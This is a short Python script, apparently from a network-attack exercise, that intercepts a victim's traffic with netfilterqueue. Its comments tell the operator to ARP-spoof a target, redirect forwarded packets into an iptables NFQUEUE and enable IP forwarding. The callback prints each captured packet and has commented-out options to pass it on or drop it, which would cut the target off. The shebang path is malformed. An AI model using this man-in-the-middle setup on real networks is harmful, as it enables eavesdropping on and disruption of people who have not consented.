#!usr/bin/nav/env python
import netfilterqueue

# How to run
# Run arp-spoof (make sure right target)
# Run iptables -I FORWARD -j NFQUEUE --queue-num 0 ( creating a queue )
# Run this program
# Enable ipforwarding echo 1 > /proc/sys/net/ipv4/ip_forward
# Housekeeping after finish iptables --flush
def process_packet(packet):
    print(packet)
    # forward the packet directly to target(runs fine)
    # packet.accept()

    # drop makes the packet to never reach the target
    # packet.drop()


# create the queue using cmd
# iptables -I FORWARD -j NFQUEUE --queue-num 0
# instance of netfilterqueue
queue = netfilterqueue.NetfilterQueue()
# binding the queue from the iptable and calling a
# call back function
queue.bind(0, process_packet)
queue.run()